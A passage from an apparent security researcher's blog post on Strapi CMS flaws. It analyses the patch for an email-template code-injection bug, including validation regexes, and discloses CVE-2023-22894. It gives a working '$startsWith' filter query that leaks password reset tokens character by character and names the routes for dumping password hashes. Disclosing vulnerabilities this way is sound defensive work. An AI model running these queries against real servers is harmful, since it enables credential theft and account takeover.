+<span class="kd">const</span><span class="w"> </span><span class="nx">keysDeep</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="nx">obj</span><span class="p">,</span><span class="w"> </span><span class="nx">path</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[])</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"></span>
+<span class="w">  </span><span class="o">!</span><span class="nx">_</span><span class="p">.</span><span class="nx">isObject</span><span class="p">(</span><span class="nx">obj</span><span class="p">)</span><span class="w"></span>
+<span class="w">    </span><span class="o">?</span><span class="w"> </span><span class="nx">path</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="s1">'.'</span><span class="p">)</span><span class="w"></span>
+<span class="w">    </span><span class="o">:</span><span class="w"> </span><span class="nx">_</span><span class="p">.</span><span class="nx">reduce</span><span class="p">(</span><span class="nx">obj</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="nx">acc</span><span class="p">,</span><span class="w"> </span><span class="nx">next</span><span class="p">,</span><span class="w"> </span><span class="nx">key</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">_</span><span class="p">.</span><span class="nx">concat</span><span class="p">(</span><span class="nx">acc</span><span class="p">,</span><span class="w"> </span><span class="nx">keysDeep</span><span class="p">(</span><span class="nx">next</span><span class="p">,</span><span class="w"> </span><span class="p">[...</span><span class="nx">path</span><span class="p">,</span><span class="w"> </span><span class="nx">key</span><span class="p">])),</span><span class="w"> </span><span class="p">[]);</span><span class="w"></span>
+
+<span class="nx">module</span><span class="p">.</span><span class="nx">exports</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">  </span><span class="nx">removeUndefined</span><span class="p">,</span><span class="w"></span>
+<span class="w">  </span><span class="nx">keysDeep</span><span class="p">,</span><span class="w"></span>
+<span class="p">};</span><span class="w"></span>
+</code></pre>
+</div>
+<p>
+ <a href="https://github.com/strapi/strapi/blob/0458e88bce7060b72450181eff292900135c82e1/packages/core/utils/lib/template.js">
+  <code>
+   packages/core/utils/lib/template.js
+  </code>
+ </a>
+</p>
+<div class="codehilite">
+ <pre><span></span><code><span class="s1">'use strict'</span><span class="p">;</span><span class="w"></span>
+
+<span class="cm">/**</span>
+<span class="cm"> * Create a strict interpolation RegExp based on the given variables' name</span>
+<span class="cm"> *</span>
+<span class="cm"> * @param {string[]} allowedVariableNames - The list of allowed variables</span>
+<span class="cm"> * @param {string} [flags] - The RegExp flags</span>
+<span class="cm"> */</span><span class="w"></span>
+<span class="kd">const</span><span class="w"> </span><span class="nx">createStrictInterpolationRegExp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="nx">allowedVariableNames</span><span class="p">,</span><span class="w"> </span><span class="nx">flags</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">  </span><span class="kd">const</span><span class="w"> </span><span class="nx">oneOfVariables</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">allowedVariableNames</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="s1">'|'</span><span class="p">);</span><span class="w"></span>
+
+<span class="w">  </span><span class="c1">// 1. We need to match the delimiters: &lt;%= ... %&gt;</span><span class="w"></span>
+<span class="w">  </span><span class="c1">// 2. We accept any number of whitespaces characters before and/or after the variable name: \s* ... \s*</span><span class="w"></span>
+<span class="w">  </span><span class="c1">// 3. We only accept values from the variable list as interpolation variables' name: : (${oneOfVariables})</span><span class="w"></span>
+<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nb">RegExp</span><span class="p">(</span><span class="sb">`&lt;%=\\s*(</span><span class="si">${</span><span class="nx">oneOfVariables</span><span class="si">}</span><span class="sb">)\\s*%&gt;`</span><span class="p">,</span><span class="w"> </span><span class="nx">flags</span><span class="p">);</span><span class="w"></span>
+<span class="p">};</span><span class="w"></span>
+
+<span class="cm">/**</span>
+<span class="cm"> * Create a loose interpolation RegExp to match as many groups as possible</span>
+<span class="cm"> *</span>
+<span class="cm"> * @param {string} [flags] - The RegExp flags</span>
+<span class="cm"> */</span><span class="w"></span>
+<span class="kd">const</span><span class="w"> </span><span class="nx">createLooseInterpolationRegExp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="nx">flags</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nb">RegExp</span><span class="p">(</span><span class="sr">/&lt;%=([\s\S]+?)%&gt;/</span><span class="p">,</span><span class="w"> </span><span class="nx">flags</span><span class="p">);</span><span class="w"></span>
+
+<span class="nx">module</span><span class="p">.</span><span class="nx">exports</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">  </span><span class="nx">createStrictInterpolationRegExp</span><span class="p">,</span><span class="w"></span>
+<span class="w">  </span><span class="nx">createLooseInterpolationRegExp</span><span class="p">,</span><span class="w"></span>
+<span class="p">};</span><span class="w"></span>
+</code></pre>
+</div>
+<p>
+ Breaking down what these two functions do,
+ <code>
+  keysDeep
+ </code>
+ reduces the keys in the data to an array. For an example,
+ <code>
+  keysDeep
+ </code>
+ will reduce the Object
+ <code>
+  {name: "Jeff", message: "Hi"}
+ </code>
+ to the array
+ <code>
+  ['name', 'message']
+ </code>
+ . Then the magic happens with
+ <code>
+  createStrictInterpolationRegExp
+ </code>
+ that concatenates these data keys into a single regex pattern to only allow
+ <code>
+  lodash
+ </code>
+ to render interpolate delimiters that contain keys from the data that is intended to be rendered. Using the previous example, the array
+ <code>
+  ['name', 'message']
+ </code>
+ would result in interpolation regex pattern
+ <code>
+  /&lt;%=\s*(name|message)\s*%&gt;/g
+ </code>
+ .
+</p>
+<p>
+ This is a neat strategy that would prevent
+ <code>
+  lodash
+ </code>
+ from executing any other interpolate delimiter blocks that are not strictly defined in the data. Malicious payloads that somehow do make its way into an email template would not been evaluated since they are not defined in the data that would be rendered. Initially, the only method I could think about how to render a malicious delimiter within an email template is to
+ <strong>
+  actually modify the code to remove this protection
+ </strong>
+ <em>
+  (which is pretty silly since you basically have RCE if you can do that)
+ </em>
+ .
+</p>
+<p>
+ <em>
+  However
+ </em>
+</p>
+<p>
+ When I first saw the use of the
+ <code>
+  evaluate: false
+ </code>
+ option being set for the
+ <code>
+  lodash
+ </code>
+ template engine that was added into the patch I originally thought,
+</p>
+<blockquote>
+ <p>
+  "Oh neat, you can just disable the
+  <code>
+   lodash
+  </code>
+  template engine from evaluating delimiter keys in JavaScript."
+ </p>
+</blockquote>
+<p>
+ <em>
+  When I rechecked
+  <a href="https://docs-lodash.com/v4/template/">
+   the documentation for
+   <code>
+    lodash
+   </code>
+   about options for its template engine
+  </a>
+  , I realised that both Strapi's engineering team and I interpreted the
+  <code>
+   evaluate
+  </code>
+  option incorrectly.
+ </em>
+ Turns out, the
+ <code>
+  evaluate
+ </code>
+ option is for
+ <strong>
+  setting the regex pattern for evaluate delimiters
+ </strong>
+ , and does not stop it from executing delimiter keys as JavaScript code! This meant if an attacker could directly inject an email template into the database exploiting some other future vulnerability (eg. SQLi), then they could re-exploit the
+ <code>
+  lodash
+ </code>
+ template engine using the
+ <strong>
+  escape delimiter (
+  <code>
+   &lt;%- %&gt;
+  </code>
+  ) to execute code
+ </strong>
+ !
+</p>
+<p>
+ This was an important reminder to myself to
+ <strong>
+  always double check documentation when implementing security controls
+ </strong>
+ ! After I pointed out this minor issue with the patch, the Strapi team quickly set the
+ <code>
+  escape: false
+ </code>
+ option as well to disable the use of escape delimiters in templates. The changes can be seen on commit id
+ <a href="https://github.com/strapi/strapi/commit/6f07d33f8803e439201354829ceeee8ebfb919fa">
+  6f07d33f8803e439201354829ceeee8ebfb919fa
+ </a>
+ .
+</p>
+<p>
+ <em>
+  But wait, that isn't the only security control that was added.
+ </em>
+</p>
+<h3 class="major" id="fixing-the-email-template-validation">
+ Fixing the Email Template Validation
+</h3>
+<p>
+ The
+ <code>
+  isValidEmailTemplate
+ </code>
+ function was changed to the following code in the patch.
+</p>
+<details>
+ <summary>
+  <b>
+   The New
+   <code>
+    isValidEmailTemplate
+   </code>
+  </b>
+ </summary>
+ <div class="codehilite">
+  <pre><span></span><code><span class="s1">'use strict'</span><span class="p">;</span><span class="w"></span>
+
+<span class="kd">const</span><span class="w"> </span><span class="nx">_</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s1">'lodash'</span><span class="p">);</span><span class="w"></span>
+<span class="kd">const</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">  </span><span class="nx">template</span><span class="o">:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">createLooseInterpolationRegExp</span><span class="p">,</span><span class="w"> </span><span class="nx">createStrictInterpolationRegExp</span><span class="w"> </span><span class="p">},</span><span class="w"></span>
+<span class="p">}</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s1">'@strapi/utils'</span><span class="p">);</span><span class="w"></span>
+
+<span class="kd">const</span><span class="w"> </span><span class="nx">invalidPatternsRegexes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="w"></span>
+<span class="w">  </span><span class="c1">// Ignore "evaluation" patterns: &lt;% ... %&gt;</span><span class="w"></span>
+<span class="w">  </span><span class="sr">/&lt;%[^=]([\s\S]*?)%&gt;/m</span><span class="p">,</span><span class="w"></span>
+<span class="w">  </span><span class="c1">// Ignore basic string interpolations</span><span class="w"></span>
+<span class="w">  </span><span class="sr">/\${([^{}]*)}/m</span><span class="p">,</span><span class="w"></span>
+<span class="p">];</span><span class="w"></span>
+
+<span class="kd">const</span><span class="w"> </span><span class="nx">authorizedKeys</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="w"></span>
+<span class="w">  </span><span class="s1">'URL'</span><span class="p">,</span><span class="w"></span>
+<span class="w">  </span><span class="s1">'ADMIN_URL'</span><span class="p">,</span><span class="w"></span>
+<span class="w">  </span><span class="s1">'SERVER_URL'</span><span class="p">,</span><span class="w"></span>
+<span class="w">  </span><span class="s1">'CODE'</span><span class="p">,</span><span class="w"></span>
+<span class="w">  </span><span class="s1">'USER'</span><span class="p">,</span><span class="w"></span>
+<span class="w">  </span><span class="s1">'USER.email'</span><span class="p">,</span><span class="w"></span>
+<span class="w">  </span><span class="s1">'USER.username'</span><span class="p">,</span><span class="w"></span>
+<span class="w">  </span><span class="s1">'TOKEN'</span><span class="p">,</span><span class="w"></span>
+<span class="p">];</span><span class="w"></span>
+
+<span class="kd">const</span><span class="w"> </span><span class="nx">matchAll</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="nx">pattern</span><span class="p">,</span><span class="w"> </span><span class="nx">src</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">  </span><span class="kd">const</span><span class="w"> </span><span class="nx">matches</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[];</span><span class="w"></span>
+<span class="w">  </span><span class="kd">let</span><span class="w"> </span><span class="nx">match</span><span class="p">;</span><span class="w"></span>
+
+<span class="w">  </span><span class="kd">const</span><span class="w"> </span><span class="nx">regexPatternWithGlobal</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">RegExp</span><span class="p">(</span><span class="nx">pattern</span><span class="p">,</span><span class="w"> </span><span class="s1">'g'</span><span class="p">);</span><span class="w"></span>
+
+<span class="w">  </span><span class="c1">// eslint-disable-next-line no-cond-assign</span><span class="w"></span>
+<span class="w">  </span><span class="k">while</span><span class="w"> </span><span class="p">((</span><span class="nx">match</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">regexPatternWithGlobal</span><span class="p">.</span><span class="nx">exec</span><span class="p">(</span><span class="nx">src</span><span class="p">)))</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="p">[,</span><span class="w"> </span><span class="nx">group</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">match</span><span class="p">;</span><span class="w"></span>
+
+<span class="w">    </span><span class="nx">matches</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">_</span><span class="p">.</span><span class="nx">trim</span><span class="p">(</span><span class="nx">group</span><span class="p">));</span><span class="w"></span>
+<span class="w">  </span><span class="p">}</span><span class="w"></span>
+
+<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="nx">matches</span><span class="p">;</span><span class="w"></span>
+<span class="p">};</span><span class="w"></span>
+
+<span class="kd">const</span><span class="w"> </span><span class="nx">isValidEmailTemplate</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="nx">template</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">  </span><span class="c1">// Check for known invalid patterns</span><span class="w"></span>
+<span class="w">  </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kd">const</span><span class="w"> </span><span class="nx">reg</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="nx">invalidPatternsRegexes</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">reg</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">template</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">      </span><span class="k">return</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="p">}</span><span class="w"></span>
+<span class="w">  </span><span class="p">}</span><span class="w"></span>
+
+<span class="w">  </span><span class="kd">const</span><span class="w"> </span><span class="nx">interpolation</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="c1">// Strict interpolation pattern to match only valid groups</span><span class="w"></span>
+<span class="w">    </span><span class="nx">strict</span><span class="o">:</span><span class="w"> </span><span class="nx">createStrictInterpolationRegExp</span><span class="p">(</span><span class="nx">authorizedKeys</span><span class="p">),</span><span class="w"></span>
+<span class="w">    </span><span class="c1">// Weak interpolation pattern to match as many group as possible.</span><span class="w"></span>
+<span class="w">    </span><span class="nx">loose</span><span class="o">:</span><span class="w"> </span><span class="nx">createLooseInterpolationRegExp</span><span class="p">(),</span><span class="w"></span>
+<span class="w">  </span><span class="p">};</span><span class="w"></span>
+
+<span class="w">  </span><span class="c1">// Compute both strict &amp; loose matches</span><span class="w"></span>
+<span class="w">  </span><span class="kd">const</span><span class="w"> </span><span class="nx">strictMatches</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">matchAll</span><span class="p">(</span><span class="nx">interpolation</span><span class="p">.</span><span class="nx">strict</span><span class="p">,</span><span class="w"> </span><span class="nx">template</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="kd">const</span><span class="w"> </span><span class="nx">looseMatches</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">matchAll</span><span class="p">(</span><span class="nx">interpolation</span><span class="p">.</span><span class="nx">loose</span><span class="p">,</span><span class="w"> </span><span class="nx">template</span><span class="p">);</span><span class="w"></span>
+
+<span class="w">  </span><span class="c1">// If we have more matches with the loose RegExp than with the strict one,</span><span class="w"></span>
+<span class="w">  </span><span class="c1">// then it means that at least one of the interpolation group is invalid</span><span class="w"></span>
+<span class="w">  </span><span class="c1">// Note: In the future, if we wanted to give more details for error formatting</span><span class="w"></span>
+<span class="w">  </span><span class="c1">// purposes, we could return the difference between the two arrays</span><span class="w"></span>
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">looseMatches</span><span class="p">.</span><span class="nx">length</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="nx">strictMatches</span><span class="p">.</span><span class="nx">length</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span><span class="w"></span>
+<span class="w">  </span><span class="p">}</span><span class="w"></span>
+
+<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span><span class="w"></span>
+<span class="p">};</span><span class="w"></span>
+
+<span class="nx">module</span><span class="p">.</span><span class="nx">exports</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">  </span><span class="nx">isValidEmailTemplate</span><span class="p">,</span><span class="w"></span>
+<span class="p">};</span><span class="w"></span>
+</code></pre>
+ </div>
+</details>
+<p>
+ The regex pattern
+ <code>
+  /&lt;%[^=]([\s\S]*?)%&gt;/m
+ </code>
+ now only allows for the
+ <code>
+  &lt;%= %&gt;
+ </code>
+ delimiter to be used, and can no longer be bypassed since
+ <code>
+  \s
+ </code>
+ and
+ <code>
+  \S
+ </code>
+ would match any whitespace and non-whitespace character respectively. Oddly enough, the
+ <code>
+  /\${([^{}]*)}/m
+ </code>
+ pattern was not fixed. However, it makes no difference since the
+ <code>
+  interpolate
+ </code>
+ option is now set for the
+ <code>
+  lodash
+ </code>
+ template engine and overwrites the default configuration that allowed using the ES literal delimiter (
+ <code>
+  ${ }
+ </code>
+ ) to evaluate code.
+</p>
+<p>
+ <a href="https://docs-lodash.com/v4/template/">
+  <em>
+   From the
+   <code>
+    lodash
+   </code>
+   documentation
+  </em>
+ </a>
+ <br/>
+ <img alt="" class="center" src="/images/blog/multi_strapi_vulns/esliteral-docs.png"/>
+</p>
+<p>
+ The following code now checks that only authorised keys are allowed within the
+ <code>
+  &lt;%= %&gt;
+ </code>
+ .
+</p>
+<div class="codehilite">
+ <pre><span></span><code><span class="w">  </span><span class="kd">const</span><span class="w"> </span><span class="nx">interpolation</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="c1">// Strict interpolation pattern to match only valid groups</span><span class="w"></span>
+<span class="w">    </span><span class="nx">strict</span><span class="o">:</span><span class="w"> </span><span class="nx">createStrictInterpolationRegExp</span><span class="p">(</span><span class="nx">authorizedKeys</span><span class="p">),</span><span class="w"></span>
+<span class="w">    </span><span class="c1">// Weak interpolation pattern to match as many group as possible.</span><span class="w"></span>
+<span class="w">    </span><span class="nx">loose</span><span class="o">:</span><span class="w"> </span><span class="nx">createLooseInterpolationRegExp</span><span class="p">(),</span><span class="w"></span>
+<span class="w">  </span><span class="p">};</span><span class="w"></span>
+
+<span class="w">  </span><span class="c1">// Compute both strict &amp; loose matches</span><span class="w"></span>
+<span class="w">  </span><span class="kd">const</span><span class="w"> </span><span class="nx">strictMatches</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">matchAll</span><span class="p">(</span><span class="nx">interpolation</span><span class="p">.</span><span class="nx">strict</span><span class="p">,</span><span class="w"> </span><span class="nx">template</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="kd">const</span><span class="w"> </span><span class="nx">looseMatches</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">matchAll</span><span class="p">(</span><span class="nx">interpolation</span><span class="p">.</span><span class="nx">loose</span><span class="p">,</span><span class="w"> </span><span class="nx">template</span><span class="p">);</span><span class="w"></span>
+
+<span class="w">  </span><span class="c1">// If we have more matches with the loose RegExp than with the strict one,</span><span class="w"></span>
+<span class="w">  </span><span class="c1">// then it means that at least one of the interpolation group is invalid</span><span class="w"></span>
+<span class="w">  </span><span class="c1">// Note: In the future, if we wanted to give more details for error formatting</span><span class="w"></span>
+<span class="w">  </span><span class="c1">// purposes, we could return the difference between the two arrays</span><span class="w"></span>
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">looseMatches</span><span class="p">.</span><span class="nx">length</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="nx">strictMatches</span><span class="p">.</span><span class="nx">length</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span><span class="w"></span>
+<span class="w">  </span><span class="p">}</span><span class="w"></span>
+</code></pre>
+</div>
+<p>
+ As mentioned previously, the
+ <code>
+  createStrictInterpolationRegExp
+ </code>
+ will create an allowed regex pattern from the
+ <code>
+  authorizedKeys
+ </code>
+ array. On the other hand,
+ <code>
+  createLooseInterpolationRegExp
+ </code>
+ just returns the regex pattern
+ <code>
+  /&lt;%=([\s\S]+?)%&gt;/
+ </code>
+ that would match any text between
+ <code>
+  &lt;%= %&gt;
+ </code>
+ . Therefore, if
+ <code>
+  looseMatches
+ </code>
+ has a longer length than
+ <code>
+  strictMatches
+ </code>
+ then it can be implied that there is another interpolate delimiter with a key that is not in the authorised keys list.
+</p>
+</div>
+</div>
+</section>
+<section class="wrapper style2 ">
+<div class="inner">
+<div class="content">
+
+<h1 class="major" id="cve-2023-22894-leaking-sensitive-user-information-by-filtering-on-private-fields-in-strapi-versions-471">
+ CVE-2023-22894: Leaking Sensitive User Information by Filtering on Private Fields in Strapi Versions &lt;=4.7.1
+</h1>
+<p>
+ After reporting the above two vulnerabilities, I realised that Strapi's filtering functionality can be exploited to filter responses on
+ <strong>
+  private fields
+ </strong>
+ . Using this info and the
+ <code>
+  $startsWith
+ </code>
+ filter operation, I discovered a method to
+ <strong>
+  leak the values of private fields by inferring values from API results
+ </strong>
+ . Simply put this vulnerability is equivalent to
+ <a href="https://owasp.org/www-community/attacks/Blind_SQL_Injection">
+  <strong>
+   blind SQLi
+  </strong>
+ </a>
+ or
+ <a href="https://book.hacktricks.xyz/pentesting-web/nosql-injection">
+  <strong>
+   NoSQLi
+  </strong>
+ </a>
+ vulnerabilities. However, in this case I was targetting the logic of how Strapi filters database queries.
+</p>
+<p>
+ When I first reported this vulnerability, I originally thought that an attacker would require admin access to exploit. However, after my initial report I had a
+ <em>
+  gut feeling
+ </em>
+ to explore this vulnerability further.
+</p>
+<p>
+ <strong>
+  That's when I realised that an unauthenticated attacker can exploit this everywhere on Strapi and it can be used to hijack Strapi administrator accounts!
+ </strong>
+</p>
+<p>
+ <img alt="" class="center" src="/images/blog/multi_strapi_vulns/gorilla-stare.gif"/>
+</p>
+<p>
+ <em>
+  Oh god that is terrifying...
+ </em>
+</p>
+<p>
+ Well let's get into the juicy details and start stealing some Strapi Administrator accounts!
+</p>
+</div>
+</div>
+</section>
+<section class="wrapper style5 alt">
+<div class="inner">
+<div class="content">
+
+<h2 class="major" id="tldr-vulnerability-details_2">
+ TL;DR Vulnerability Details
+</h2>
+<ul>
+ <li>
+  <strong>
+   CVE:
+  </strong>
+  CVE-2023-22894
+ </li>
+ <li>
+  <strong>
+   CVSS v3.1 Vector:
+  </strong>
+  <a href="https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H&amp;version=3.1">
+   AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+  </a>
+ </li>
+ <li>
+  <strong>
+   Affected Versions:
+  </strong>
+  &lt;=4.7.1
+ </li>
+ <li>
+  <strong>
+   How to Patch:
+  </strong>
+  Immediately
+  <strong>
+   update
+  </strong>
+  your Strapi to version
+  <strong>
+   &gt;=4.8.0
+  </strong>
+  ! If you using Strapi
+  <strong>
+   3.x.x
+  </strong>
+  or below,
+  <strong>
+   IMMEDIATELY UPDATE TO A PATCHED 4.x.x VERSION!
+  </strong>
+  Strapi versions 3.x.x reached its
+  <strong>
+   end of life support on the December 31st 2022
+  </strong>
+  , and would
+  <strong>
+   not receive a patch
+  </strong>
+  for this vulnerability!
+ </li>
+</ul>
+</div>
+</div>
+</section>
+<section class="wrapper style5 ">
+<div class="inner">
+<div class="content">
+
+<h2 class="major" id="vulnerability-disclosure-timeline_2">
+ Vulnerability Disclosure Timeline
+</h2>
+<table>
+ <thead>
+  <tr>
+   <th>
+    Time
+   </th>
+   <th>
+    Event
+   </th>
+  </tr>
+ </thead>
+ <tbody>
+  <tr>
+   <td>
+    2023/01/03 01:26 PM UTC
+   </td>
+   <td>
+    Reported this vulnerability to Strapi as
+    <em>
+     Medium
+    </em>
+    severity since the first vector was only accessible by Strapi administrators.
+   </td>
+  </tr>
+  <tr>
+   <td>
+    2023/01/03 07:03 PM UTC
+   </td>
+   <td>
+    Strapi acknowledged my vulnerability report.
+   </td>
+  </tr>
+  <tr>
+   <td>
+    2023/01/18 08:05 AM UTC
+   </td>
+   <td>
+    Discovered and notified Strapi that
+    <strong>
+     unauthenticated users could exploit this vulnerability
+    </strong>
+    and escalated the severity from
+    <em>
+     Medium
+    </em>
+    to
+    <strong>
+     Critical
+    </strong>
+    . However, at the time I only thought an attacker can exploit under certain conditions.
+   </td>
+  </tr>
+  <tr>
+   <td>
+    2023/01/21 10:26 AM UTC
+   </td>
+   <td>
+    Discovered a method to exploit this vulnerability as an
+    <strong>
+     unauthenticated user on all Strapi servers
+    </strong>
+    . I also sent Strapi a POC that would achieve
+    <strong>
+     Unauthenticated Remote Code Execution
+    </strong>
+    on all Strapi &lt;=4.5.5 servers by chaining
+    <strong>
+     CVE-2023-22894
+    </strong>
+    and
+    <strong>
+     CVE-2023-22621
+    </strong>
+    together.
+   </td>
+  </tr>
+  <tr>
+   <td>
+    2023/02/23 02:31 PM UTC
+   </td>
+   <td>
+    After rigorous patching and testing by Strapi I was provided with the patch to test.
+   </td>
+  </tr>
+  <tr>
+   <td>
+    2023/03/05 02:51 AM UTC
+   </td>
+   <td>
+    I confirmed Strapi's patch fixed this vulnerability.
+   </td>
+  </tr>
+  <tr>
+   <td>
+    2023/03/15 03:39 PM UTC
+   </td>
+   <td>
+    Strapi released version
+    <strong>
+     4.8.0
+    </strong>
+   </td>
+  </tr>
+ </tbody>
+</table>
+</div>
+</div>
+</section>
+<section class="wrapper style1 alt">
+<div class="inner">
+<div class="content">
+
+<h2 class="major" id="dumping-sensitive-user-as-an-administrator-user">
+ Dumping Sensitive User as an Administrator User
+</h2>
+<p>
+ I was just goofing about on the Strapi admin panel on my test server when I saw this nice feature for filtering entries for the API user collection.
+</p>
+<p>
+ <img alt="" class="center" src="/images/blog/multi_strapi_vulns/strapi-filters.png"/>
+</p>
+<p>
+ <em>
+  Interesting... I wonder if I can see sensitive information of users using the admin API.
+ </em>
+</p>
+<p>
+ Taking a closer look at the API requests on Burp Suite, the API responses do not contain the values for the
+ <code>
+  password
+ </code>
+ or
+ <code>
+  reset_password_token
+ </code>
+ columns.
+</p>
+<p>
+ <img alt="" class="center" src="/images/blog/multi_strapi_vulns/user-api-response.png"/>
+</p>
+<p>
+ However, I was curious if private fields were filtered from the queries or
+ <strong>
+  from the results of a query
+ </strong>
+ (
+ <em>
+  a little foreshadowing there
+ </em>
+ ). One of the first things I noticed was the
+ <code>
+  $startsWith
+ </code>
+ filter operation that searches for entries that start with the provided value. So I fiddled around with the
+ <code>
+  $startsWith
+ </code>
+ filter operation and realised that Strapi
+ <strong>
+  just removes private fields from query results and does not remove private fields from the actual query
+ </strong>
+ ! This means that you can bruteforce character by character the value of private fields and infer the actual values by looking for when the number of entries in the API response changes!
+</p>
+<p>
+ To demonstrate, I created a test API account named
+ <code>
+  resetpassword
+ </code>
+ and started the password reset process that saved a reset token that started with
+ <code>
+  6a4b40
+ </code>
+ in the
+ <code>
+  reset_password_token
+ </code>
+ column for the user. Then I constructed the following filter query that returns back the entry of the
+ <code>
+  resetpassword
+ </code>
+ account, since it was the only API user account that had a reset password token that started with
+ <code>
+  6a4b40
+ </code>
+ .
+</p>
+<div class="codehilite">
+ <pre><span></span><code>filters[$and][0][reset_password_token][$startsWith]=6a4b40
+</code></pre>
+</div>
+<p>
+ <img alt="" class="center" src="/images/blog/multi_strapi_vulns/returning-user-by-filter.png"/>
+</p>
+<p>
+ <strong>
+  However, if I instead filter by password reset tokens that start with
+  <code>
+   6a4b4f
+  </code>
+  the API response is empty because no account has a password reset token that starts with
+  <code>
+   6a4b4f
+  </code>
+  !
+ </strong>
+</p>
+<p>
+ <img alt="" class="center" src="/images/blog/multi_strapi_vulns/empty-response.png"/>
+</p>
+<p>
+ <em>
+  Rightio that ain't good...
+ </em>
+</p>
+<p>
+ The next thing I decided to look into was the scope of this vulnerability being exploited by administrator users. As a
+ <strong>
+  Super Administrator
+ </strong>
+ user, you can
+ <strong>
+  leak all API user's and Strapi admin user's password hashes and reset tokens
+ </strong>
+ by exploiting Strapi's filters on the following API routes.
+</p>
+<ul>
+ <li>
+  Dumping API user route:
+  <code>
+   /content-manager/collection-types/plugin::users-permissions.user
+  </code>
+ </li>
+ <li>
+  Dumping Admin user route:
+  <code>
+   /admin/users
+  </code>
+ </li>
+</ul>
+<p>
+ The following GIF is a recording of dumping all password hashes and reset tokens on Strapi using a Super Admin account using my POC script (shown later on in this section).
+</p>
+<p>
+ <img alt="" class="center" src="/images/blog/multi_strapi_vulns/admin-dump-sensitive-data.gif"/>
+</p>
+<p>
+ However, lower privileged administrator accounts (eg. admin users assigned the Editor role) cannot dump API user or admin credentials by default. The only scenario that I found was if a lower privileged Strapi admin user was assigned the following permissions for API users, then an attacker could dump private data only for API users.
+</p>
+<p>
+ <img alt="" class="center" src="/images/blog/multi_strapi_vulns/editor-perms.png"/>
+</p>
+<p>
+ GIF below shows dumping private data only for API users when an admin account with the Editor role is used with the above permissions.
+</p>
+<p>
